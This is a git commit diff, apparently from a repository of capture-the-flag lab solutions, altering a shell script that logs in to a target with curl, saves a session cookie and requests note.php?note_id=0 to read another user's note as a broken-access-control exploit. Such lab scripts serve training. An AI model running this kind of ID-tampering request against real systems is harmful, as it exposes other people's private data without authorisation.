83e46ab5f81088b31d06c0618a8939882e8329b0
Nadege Lemperiere <nadege.lemperiere@gmail.com>
2024-11-30 19:02:11 -0500

    Testing script

--- rooms/owasptop102021/broken-acces-control.sh
+++ rooms/owasptop102021/broken-acces-control.sh
@@ -14,7 +14,7 @@ mkdir /work/
 # Authenticate and save the PHPSESSID cookie
 echo "Authenticating and capturing PHPSESSID..."
 curl -X GET "$target_ip" -c "/work/cookie-bac.txt" -L -v
-curl -s -X POST "$target_ip" -b /work/cookie-bac.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "username=noot&password=test1234"
+curl -X POST "$target_ip" -b /work/cookie-bac.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "username=noot&password=test1234"
 
 # Extract the PHPSESSID
 PHPSESSID=$(grep PHPSESSID "/work/cookie-bac.txt" | awk '{print $7}')
@@ -30,7 +30,7 @@ echo "Authentication successful. PHPSESSID: $PHPSESSID"
 
 # Use the PHPSESSID for the next HTTP request
 echo "Fetching protected resource..."
-curl -s -X GET "$target_ip/note.php?note_id=0" -b /work/cookie-bac.txt -H "Content-Type: application/json" -o /work/bac-flag.html -L -v
+curl -X GET "$target_ip/note.php?note_id=0" -b /work/cookie-bac.txt -H "Content-Type: application/json" -o /work/bac-flag.html -L -v
 
 # Clean up
 #rm -f /work/cookie-bac.txt
